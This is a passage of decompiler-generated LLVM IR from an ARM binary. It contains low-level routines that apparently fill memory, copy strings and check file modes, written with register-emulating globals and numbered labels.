  %v0_10e68 = call i32 @function_11008()
  %v2_10e70 = inttoptr i32 %v0_10e68 to i32*
  store i32 12, i32* %v2_10e70, align 4
  %v0_10e74.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e38, %dec_label_pc_10e30, %dec_label_pc_10e5c
  %v0_10e74 = phi i32 [ %v2_10e50, %dec_label_pc_10e38 ], [ 0, %dec_label_pc_10e30 ], [ %v0_10e74.pre, %dec_label_pc_10e5c ]
  store i32 %v6_10ddc, i32* @r7, align 4
  ret i32 %v0_10e74

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10e74, { 2, 0, 1 }
}

define i32 @function_10e84(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e84:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_10e84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10e84, label %bb, label %dec_label_pc_10e84._crit_edge

dec_label_pc_10e84._crit_edge:                    ; preds = %dec_label_pc_10e84
  br label %bb11

bb:                                               ; preds = %dec_label_pc_10e84
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_10e84._crit_edge, %bb
  %v2_10e8c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10e8c, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10e98 = call i32 @function_13b20()
  store i32 %v0_10e98, i32* @r5, align 4
  %v2_10e9c = icmp eq i32 %v0_10e98, 0
  br i1 %v2_10e9c, label %dec_label_pc_10ea4, label %dec_label_pc_10f0c

dec_label_pc_10ea4:                               ; preds = %bb11
  %v1_10ea8 = and i32 %tmp5, 61440
  store i32 %v1_10ea8, i32* @r3, align 4
  %v7_10eac = icmp eq i32 %v1_10ea8, 16384
  br i1 %v7_10eac, label %dec_label_pc_10ec4, label %dec_label_pc_10eb4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ea4
  %v0_10eb4 = call i32 @function_11008()
  br label %dec_label_pc_10ef0

dec_label_pc_10ec4:                               ; preds = %dec_label_pc_10ea4
  %v0_10ec4 = load i32, i32* @r4, align 4
  %v2_10ecc = call i32 @function_10a14(i32 %v0_10ec4, i32 3)
  %v7_10ed0 = icmp eq i32 %v2_10ecc, -1
  br i1 %v7_10ed0, label %dec_label_pc_10f0c, label %dec_label_pc_10ed8

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10ec4
  %v1_10ed8 = urem i32 %v2_10ecc, 4
  %v7_10edc = icmp eq i32 %v1_10ed8, 1
  br i1 %v7_10edc, label %dec_label_pc_10ee4, label %dec_label_pc_10ef8

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ed8
  %v0_10ee4 = call i32 @function_11008()
  br label %dec_label_pc_10ef0

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10eb4, %dec_label_pc_10ee4
  %storemerge2 = phi i32 [ %v0_10eb4, %dec_label_pc_10eb4 ], [ %v0_10ee4, %dec_label_pc_10ee4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_10eb4 ], [ 22, %dec_label_pc_10ee4 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_10ef0 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_10ef0, align 4
  %v0_10f10.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10f10

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ed8
  %v0_10ef8 = load i32, i32* @r4, align 4
  %v2_10f00 = call i32 @function_10d0c(i32 %v0_10ef8, i32 %tmp)
  store i32 %v2_10f00, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10f10

dec_label_pc_10f0c:                               ; preds = %bb11, %dec_label_pc_10ec4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10ef0, %dec_label_pc_10f0c
  %v0_10f10 = phi i32 [ %v2_10f00, %dec_label_pc_10ef8 ], [ %v0_10f10.pre, %dec_label_pc_10ef0 ], [ 0, %dec_label_pc_10f0c ]
  ret i32 %v0_10f10

; uselistorder directives
  uselistorder i32 %v2_10ecc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10d0c, { 1, 0 }
  uselistorder i32 ()* @function_13b20, { 1, 0 }
  uselistorder label %dec_label_pc_10f10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f0c, { 1, 0 }
  uselistorder label %dec_label_pc_10ef0, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_10f20(i32* %arg1) local_unnamed_addr {
dec_label_pc_10f20:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10f20 = load i32, i32* @r4, align 4
  %v6_10f20 = load i32, i32* @r5, align 4
  %v9_10f20 = load i32, i32* @r6, align 4
  %v12_10f20 = load i32, i32* @r7, align 4
  %v15_10f20 = load i32, i32* @lr, align 4
  store i32 124088, i32* @r6, align 4
  %v1_10f34 = add i32 %tmp, 24
  store i32 %v1_10f34, i32* @r4, align 4
  %v4_10f38 = load i32, i32* inttoptr (i32 124124 to i32*), align 4
  store i32 %v4_10f38, i32* %r1.global-to-local, align 4
  store i32 %v1_10f34, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_10f4c = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_10f4c)
  %v0_10f60 = load i32, i32* @r6, align 4
  %v2_10f60 = add i32 %v0_10f60, 16
  %v3_10f60 = inttoptr i32 %v2_10f60 to i32*
  %v4_10f60 = load i32, i32* %v3_10f60, align 4
  store i32 %v4_10f60, i32* @ip, align 4
  store i32 69484, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10f60)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10f70:                               ; preds = %dec_label_pc_10fa0, %dec_label_pc_10f20
  %v0_10f70 = load i32, i32* @r5, align 4
  %v1_10f70 = add i32 %v0_10f70, 4
  %v2_10f70 = inttoptr i32 %v1_10f70 to i32*
  %v3_10f70 = load i32, i32* %v2_10f70, align 4
  store i32 %v3_10f70, i32* %r2.global-to-local, align 4
  %v4_10f70 = add i32 %v0_10f70, 8
  %v5_10f70 = inttoptr i32 %v4_10f70 to i32*
  %v6_10f70 = load i32, i32* %v5_10f70, align 4
  %tmp10 = icmp ugt i32 %v6_10f70, %v3_10f70
  br i1 %tmp10, label %dec_label_pc_10fa0, label %dec_label_pc_10f7c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f70
  %v1_10f7c = inttoptr i32 %v0_10f70 to i32*
  %v2_10f7c = load i32, i32* %v1_10f7c, align 4
  %v1_10f80 = add i32 %v0_10f70, 12
  %v2_10f80 = inttoptr i32 %v1_10f80 to i32*
  %v3_10f80 = load i32, i32* %v2_10f80, align 4
  store i32 %v3_10f80, i32* %r1.global-to-local, align 4
  %v1_10f84 = add i32 %v0_10f70, 20
  %v2_10f84 = inttoptr i32 %v1_10f84 to i32*
  %v3_10f84 = load i32, i32* %v2_10f84, align 4
  store i32 %v3_10f84, i32* %r2.global-to-local, align 4
  %v4_10f88 = call i32 @function_13a8c(i32 %v2_10f7c, i32 %v3_10f80, i32 %v3_10f84, i32 %v6_10f70)
  %tmp9 = icmp slt i32 %v4_10f88, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_10f98

.thread:                                          ; preds = %dec_label_pc_10f7c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10f7c
  %v1_10f98 = load i32, i32* @r5, align 4
  %v2_10f98 = add i32 %v1_10f98, 8
  %v3_10f98 = inttoptr i32 %v2_10f98 to i32*
  store i32 %v4_10f88, i32* %v3_10f98, align 4
  %v0_10f9c = load i32, i32* @r7, align 4
  %v1_10f9c = load i32, i32* @r5, align 4
  %v2_10f9c = add i32 %v1_10f9c, 4
  %v3_10f9c = inttoptr i32 %v2_10f9c to i32*
  store i32 %v0_10f9c, i32* %v3_10f9c, align 4
  %v0_10fa0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_10f70, %dec_label_pc_10f98
  %v1_10fb0 = phi i32 [ %v0_10f70, %dec_label_pc_10f70 ], [ %v0_10fa0.pre, %dec_label_pc_10f98 ]
  %v1_10fa0 = add i32 %v1_10fb0, 4
  %v2_10fa0 = inttoptr i32 %v1_10fa0 to i32*
  %v3_10fa0 = load i32, i32* %v2_10fa0, align 4
  store i32 %v3_10fa0, i32* %r2.global-to-local, align 4
  %v1_10fa4 = add i32 %v1_10fb0, 12
  %v2_10fa4 = inttoptr i32 %v1_10fa4 to i32*
  %v3_10fa4 = load i32, i32* %v2_10fa4, align 4
  store i32 %v3_10fa4, i32* %r1.global-to-local, align 4
  %v2_10fa8 = add i32 %v3_10fa4, %v3_10fa0
  store i32 %v2_10fa8, i32* @r4, align 4
  %v1_10fac = add i32 %v2_10fa8, 4
  %v2_10fac = inttoptr i32 %v1_10fac to i32*
  %v3_10fac = load i32, i32* %v2_10fac, align 4
  %v2_10fb0 = add i32 %v1_10fb0, 16
  %v3_10fb0 = inttoptr i32 %v2_10fb0 to i32*
  store i32 %v3_10fac, i32* %v3_10fb0, align 4
  %v0_10fb4 = load i32, i32* @r4, align 4
  %v1_10fb4 = add i32 %v0_10fb4, 8
  %v2_10fb4 = inttoptr i32 %v1_10fb4 to i16*
  %v3_10fb4 = load i16, i16* %v2_10fb4, align 2
  %v4_10fb4 = zext i16 %v3_10fb4 to i32
  %v0_10fb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10fb8 = load i32, i32* %r1.global-to-local, align 4
  %v2_10fb8 = add i32 %v1_10fb8, %v0_10fb8
  %v3_10fb8 = inttoptr i32 %v2_10fb8 to i32*
  %v4_10fb8 = load i32, i32* %v3_10fb8, align 4
  store i32 %v4_10fb8, i32* %r1.global-to-local, align 4
  %v2_10fbc = add i32 %v0_10fb8, %v4_10fb4
  %v2_10fc0 = icmp eq i32 %v4_10fb8, 0
  %v1_10fc4 = load i32, i32* @r5, align 4
  %v2_10fc4 = add i32 %v1_10fc4, 4
  %v3_10fc4 = inttoptr i32 %v2_10fc4 to i32*
  store i32 %v2_10fbc, i32* %v3_10fc4, align 4
  br i1 %v2_10fc0, label %dec_label_pc_10f70, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fa0, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10fd8 = load i32, i32* @r6, align 4
  %v2_10fd8 = add i32 %v0_10fd8, 24
  %v3_10fd8 = inttoptr i32 %v2_10fd8 to i32*
  %v4_10fd8 = load i32, i32* %v3_10fd8, align 4
  call void @__pseudo_branch(i32 %v4_10fd8)
  %v0_10fe4 = load i32, i32* @r4, align 4
  store i32 %v3_10f20, i32* @r4, align 4
  store i32 %v6_10f20, i32* @r5, align 4
  store i32 %v9_10f20, i32* @r6, align 4
  store i32 %v12_10f20, i32* @r7, align 4
  store i32 %v15_10f20, i32* @lr, align 4
  ret i32 %v0_10fe4

; uselistorder directives
  uselistorder i32 %v1_10fb0, { 0, 2, 1 }
  uselistorder i32 %v6_10f70, { 1, 0 }
  uselistorder i32 %v0_10f70, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_10fa0, { 1, 0 }
}

define i32 @function_10ff8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ff8:
  %v0_10ff8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10ff8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10ff8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10ff8, %bb
  %v10_11004 = phi i32 [ %arg1, %dec_label_pc_10ff8 ], [ 0, %bb ]
  ret i32 %v10_11004

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11008() local_unnamed_addr {
dec_label_pc_11008:
  store i32 add (i32 ptrtoint (i32* @global_var_d4a0.306 to i32), i32 69656), i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_1e76c.308 to i32)
}

define i32 @function_11024(i32 %arg1) local_unnamed_addr {
dec_label_pc_11024:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11028 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11028, i32* @r0, align 4
  %v1_11030 = call i32 @function_13efc(i32 %v2_11028)
  %v2_11034 = load i32, i32* %stack_var_-24, align 4
  %v2_11038 = add i32 %v2_11034, %tmp
  %v2_11040 = mul i32 %v2_11038, 10000
  %v1_11044 = and i32 %v2_11040, 2147483632
  ret i32 %v1_11044

; uselistorder directives
  uselistorder i32 %v2_11028, { 1, 0 }
}

define i32 @function_11054(i32 %arg1) local_unnamed_addr {
dec_label_pc_11054:
  %v0_11054 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11054, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11054
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11054, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_11060(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11060:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11064 = load i32, i32* @r2, align 4
  %v8_11064 = icmp eq i32 %v0_11064, 8
  store i1 %v8_11064, i1* %cpsr_z.global-to-local, align 1
  %v5_11068 = icmp slt i32 %v0_11064, 8
  br i1 %v5_11068, label %dec_label_pc_110c8, label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_11060
  %v4_1106c = mul i32 %arg2, 256
  %v5_1106c = or i32 %v4_1106c, %arg2
  %v4_11070 = mul i32 %v5_1106c, 65536
  %v5_11070 = or i32 %v4_11070, %v5_1106c
  store i32 %v5_11070, i32* %r1.global-to-local, align 4
  %v1_1107457 = urem i32 %tmp, 4
  %v2_1107458 = icmp eq i32 %v1_1107457, 0
  store i1 %v2_1107458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1107458, label %dec_label_pc_11084, label %bb

bb:                                               ; preds = %dec_label_pc_1106c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1106c ]
  %v3_1107859 = phi i32 [ %v6_11078, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1106c ]
  %v4_11078 = inttoptr i32 %v3_1107859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11078, align 1
  %v5_11078 = load i32, i32* @r3, align 4
  %v6_11078 = add i32 %v5_11078, 1
  store i32 %v6_11078, i32* @r3, align 4
  %v0_1107c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11088.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1107c.pr, label %dec_label_pc_11084, label %.thread

.thread:                                          ; preds = %bb
  %v2_1107c = add i32 %v0_11088.pr.pre, -1
  store i32 %v2_1107c, i32* @r2, align 4
  %v1_11074 = urem i32 %v6_11078, 4
  %v2_11074 = icmp eq i32 %v1_11074, 0
  store i1 %v2_11074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11074, label %dec_label_pc_11084, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11078.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11078.pre to i8
  br label %bb

dec_label_pc_11084:                               ; preds = %.thread, %bb, %dec_label_pc_1106c
  %v0_1109028 = phi i32 [ %tmp, %dec_label_pc_1106c ], [ %v6_11078, %bb ], [ %v6_11078, %.thread ]
  %v0_11088.pr = phi i32 [ %v0_11064, %dec_label_pc_1106c ], [ %v0_11088.pr.pre, %bb ], [ %v2_1107c, %.thread ]
  %v0_11084 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11084, i32* @ip, align 4
  %v8_1108810 = icmp eq i32 %v0_11088.pr, 8
  store i1 %v8_1108810, i1* %cpsr_z.global-to-local, align 1
  %v5_1108c11 = icmp slt i32 %v0_11088.pr, 8
  br i1 %v5_1108c11, label %dec_label_pc_110c8, label %dec_label_pc_11090.preheader

dec_label_pc_11090.preheader:                     ; preds = %dec_label_pc_11084
  %v1_1109046 = inttoptr i32 %v0_1109028 to i32*
  store i32 %v0_11084, i32* %v1_1109046, align 4
  %v3_1109047 = add i32 %v0_1109028, 4
  %v4_1109048 = inttoptr i32 %v3_1109047 to i32*
  %v5_1109049 = load i32, i32* @ip, align 4
  store i32 %v5_1109049, i32* %v4_1109048, align 4
  %v6_1109050 = add i32 %v0_1109028, 8
  store i32 %v6_1109050, i32* @r3, align 4
  %v0_1109451 = load i32, i32* @r2, align 4
  %v1_1109452 = add i32 %v0_1109451, -8
  store i32 %v1_1109452, i32* %r2.global-to-local, align 4
  %v5_1109c53 = icmp slt i32 %v1_1109452, 8
  br i1 %v5_1109c53, label %dec_label_pc_11090.dec_label_pc_110c8.loopexit_crit_edge, label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %dec_label_pc_11090.preheader, %dec_label_pc_11088.dec_label_pc_11090_crit_edge
  %v6_1109055 = phi i32 [ %v6_11090, %dec_label_pc_11088.dec_label_pc_11090_crit_edge ], [ %v6_1109050, %dec_label_pc_11090.preheader ]
  %v0_1109054 = phi i32 [ %v12_110bc, %dec_label_pc_11088.dec_label_pc_11090_crit_edge ], [ %v0_1109028, %dec_label_pc_11090.preheader ]
  %v1_110a0 = inttoptr i32 %v6_1109055 to i32*
  %v2_110a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_110a0, i32* %v1_110a0, align 4
  %v3_110a0 = add i32 %v0_1109054, 12
  %v4_110a0 = inttoptr i32 %v3_110a0 to i32*
  %v5_110a0 = load i32, i32* @ip, align 4
  store i32 %v5_110a0, i32* %v4_110a0, align 4
  %v6_110a0 = add i32 %v0_1109054, 16
  store i32 %v6_110a0, i32* @r3, align 4
  %v0_110a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_110a4 = add i32 %v0_110a4, -8
  store i32 %v1_110a4, i32* %r2.global-to-local, align 4
  %v5_110ac = icmp slt i32 %v1_110a4, 8
  br i1 %v5_110ac, label %dec_label_pc_110a0.dec_label_pc_110c8.loopexit_crit_edge, label %dec_label_pc_110b0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_110a0
  %v1_110b0 = inttoptr i32 %v6_110a0 to i32*
  %v2_110b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_110b0, i32* %v1_110b0, align 4
  %v3_110b0 = add i32 %v0_1109054, 20
  %v4_110b0 = inttoptr i32 %v3_110b0 to i32*
  %v5_110b0 = load i32, i32* @ip, align 4
  store i32 %v5_110b0, i32* %v4_110b0, align 4
  %v6_110b0 = add i32 %v0_1109054, 24
  store i32 %v6_110b0, i32* @r3, align 4
  %v0_110b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_110b4 = add i32 %v0_110b4, -8
  store i32 %v1_110b4, i32* %r2.global-to-local, align 4
  %v5_110bc = icmp slt i32 %v1_110b4, 8
  br i1 %v5_110bc, label %dec_label_pc_110b0.dec_label_pc_110c8.loopexit_crit_edge, label %dec_label_pc_11088

dec_label_pc_11088:                               ; preds = %dec_label_pc_110b0
  %v7_110bc = inttoptr i32 %v6_110b0 to i32*
  %v8_110bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_110bc, i32* %v7_110bc, align 4
  %v9_110bc = add i32 %v0_1109054, 28
  %v10_110bc = inttoptr i32 %v9_110bc to i32*
  %v11_110bc = load i32, i32* @ip, align 4
  store i32 %v11_110bc, i32* %v10_110bc, align 4
  %v12_110bc = add i32 %v0_1109054, 32
  store i32 %v12_110bc, i32* @r3, align 4
  %v6_110c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_110c0 = add i32 %v6_110c0, -8
  store i32 %v7_110c0, i32* %r2.global-to-local, align 4
  %v5_1108c = icmp slt i32 %v7_110c0, 8
  br i1 %v5_1108c, label %dec_label_pc_11088.dec_label_pc_110c8.loopexit_crit_edge, label %dec_label_pc_11088.dec_label_pc_11090_crit_edge

dec_label_pc_11088.dec_label_pc_11090_crit_edge:  ; preds = %dec_label_pc_11088
  %v2_11090.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11090 = inttoptr i32 %v12_110bc to i32*
  store i32 %v2_11090.pre, i32* %v1_11090, align 4
  %v3_11090 = add i32 %v0_1109054, 36
  %v4_11090 = inttoptr i32 %v3_11090 to i32*
  %v5_11090 = load i32, i32* @ip, align 4
  store i32 %v5_11090, i32* %v4_11090, align 4
  %v6_11090 = add i32 %v0_1109054, 40
  store i32 %v6_11090, i32* @r3, align 4
  %v0_11094 = load i32, i32* %r2.global-to-local, align 4
  %v1_11094 = add i32 %v0_11094, -8
  store i32 %v1_11094, i32* %r2.global-to-local, align 4
  %v5_1109c = icmp slt i32 %v1_11094, 8
  br i1 %v5_1109c, label %dec_label_pc_11090.dec_label_pc_110c8.loopexit_crit_edge, label %dec_label_pc_110a0

dec_label_pc_11088.dec_label_pc_110c8.loopexit_crit_edge: ; preds = %dec_label_pc_11088
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110c8

dec_label_pc_11090.dec_label_pc_110c8.loopexit_crit_edge: ; preds = %dec_label_pc_11088.dec_label_pc_11090_crit_edge, %dec_label_pc_11090.preheader
  %v1_11094.lcssa = phi i32 [ %v1_1109452, %dec_label_pc_11090.preheader ], [ %v1_11094, %dec_label_pc_11088.dec_label_pc_11090_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110c8

dec_label_pc_110a0.dec_label_pc_110c8.loopexit_crit_edge: ; preds = %dec_label_pc_110a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110c8

dec_label_pc_110b0.dec_label_pc_110c8.loopexit_crit_edge: ; preds = %dec_label_pc_110b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %dec_label_pc_11084, %dec_label_pc_11088.dec_label_pc_110c8.loopexit_crit_edge, %dec_label_pc_11090.dec_label_pc_110c8.loopexit_crit_edge, %dec_label_pc_110a0.dec_label_pc_110c8.loopexit_crit_edge, %dec_label_pc_110b0.dec_label_pc_110c8.loopexit_crit_edge, %dec_label_pc_11060
  %v0_110d0 = phi i32 [ %v0_11064, %dec_label_pc_11060 ], [ %v1_110b4, %dec_label_pc_110b0.dec_label_pc_110c8.loopexit_crit_edge ], [ %v1_110a4, %dec_label_pc_110a0.dec_label_pc_110c8.loopexit_crit_edge ], [ %v1_11094.lcssa, %dec_label_pc_11090.dec_label_pc_110c8.loopexit_crit_edge ], [ %v7_110c0, %dec_label_pc_11088.dec_label_pc_110c8.loopexit_crit_edge ], [ %v0_11088.pr, %dec_label_pc_11084 ]
  %v2_110c8 = icmp eq i32 %v0_110d0, 0
  store i1 %v2_110c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_110c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_110c8
  %v1_110d0 = sub i32 7, %v0_110d0
  store i32 %v1_110d0, i32* %r2.global-to-local, align 4
  %v3_110d4 = mul i32 %v1_110d0, 4
  %v4_110d4 = add i32 %v3_110d4, ptrtoint (i32* @global_var_110dc.310 to i32)
  call void @__pseudo_branch(i32 %v4_110d4)
  %v0_110dc = load i32, i32* %r1.global-to-local, align 4
  %v1_110dc = trunc i32 %v0_110dc to i8
  %v2_110dc = load i32, i32* @r3, align 4
  %v3_110dc = inttoptr i32 %v2_110dc to i8*
  store i8 %v1_110dc, i8* %v3_110dc, align 1
  %v4_110dc = load i32, i32* @r3, align 4
  %v5_110dc = add i32 %v4_110dc, 1
  store i32 %v5_110dc, i32* %r3.global-to-local, align 4
  %v0_110e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_110e0 = trunc i32 %v0_110e0 to i8
  %v3_110e0 = inttoptr i32 %v5_110dc to i8*
  store i8 %v1_110e0, i8* %v3_110e0, align 1
  %v4_110e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_110e0 = add i32 %v4_110e0, 1
  store i32 %v5_110e0, i32* %r3.global-to-local, align 4
  %v0_110e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_110e4 = trunc i32 %v0_110e4 to i8
  %v3_110e4 = inttoptr i32 %v5_110e0 to i8*
  store i8 %v1_110e4, i8* %v3_110e4, align 1
  %v4_110e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_110e4 = add i32 %v4_110e4, 1
  store i32 %v5_110e4, i32* %r3.global-to-local, align 4
  %v0_110e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_110e8 = trunc i32 %v0_110e8 to i8
  %v3_110e8 = inttoptr i32 %v5_110e4 to i8*
  store i8 %v1_110e8, i8* %v3_110e8, align 1
  %v4_110e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_110e8 = add i32 %v4_110e8, 1
  store i32 %v5_110e8, i32* %r3.global-to-local, align 4
  %v0_110ec = load i32, i32* %r1.global-to-local, align 4
  %v1_110ec = trunc i32 %v0_110ec to i8
  %v3_110ec = inttoptr i32 %v5_110e8 to i8*
  store i8 %v1_110ec, i8* %v3_110ec, align 1
  %v4_110ec = load i32, i32* %r3.global-to-local, align 4
  %v5_110ec = add i32 %v4_110ec, 1
  store i32 %v5_110ec, i32* %r3.global-to-local, align 4
  %v0_110f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_110f0 = trunc i32 %v0_110f0 to i8
  %v3_110f0 = inttoptr i32 %v5_110ec to i8*
  store i8 %v1_110f0, i8* %v3_110f0, align 1
  %v4_110f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_110f0 = add i32 %v4_110f0, 1
  store i32 %v5_110f0, i32* %r3.global-to-local, align 4
  %v0_110f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_110f4 = trunc i32 %v0_110f4 to i8
  %v3_110f4 = inttoptr i32 %v5_110f0 to i8*
  store i8 %v1_110f4, i8* %v3_110f4, align 1
  %v4_110f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_110f4 = add i32 %v4_110f4, 1
  store i32 %v5_110f4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11090, { 1, 0 }
  uselistorder i32 %v12_110bc, { 1, 2, 0 }
  uselistorder i32 %v0_1109054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11088.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11078, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1106c, { 1, 0 }
  uselistorder i32 %v0_11064, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 12, 11, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_110c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_11100(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11100:
  %v0_11100 = call i32 @function_15180()
  ret i32 %v0_11100
}

define i32 @function_11110() local_unnamed_addr {
dec_label_pc_11110:
  %v0_11110 = call i32 @function_15180()
  ret i32 %v0_11110
}

define i32 @function_11120(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11120:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_111301 = load i32, i32* @r1, align 4
  %v1_111302 = inttoptr i32 %v0_111301 to i8*
  %v2_111303 = load i8, i8* %v1_111302, align 1
  %v2_111345 = icmp eq i8 %v2_111303, 0
  store i1 %v2_111345, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_111303, i8* %arg1, align 1
  br i1 %v2_111345, label %dec_label_pc_11140, label %dec_label_pc_11128

dec_label_pc_11128:                               ; preds = %dec_label_pc_11120, %dec_label_pc_11128
  %v0_11128 = load i32, i32* @r1, align 4
  %v1_11128 = add i32 %v0_11128, 1
  store i32 %v1_11128, i32* @r1, align 4
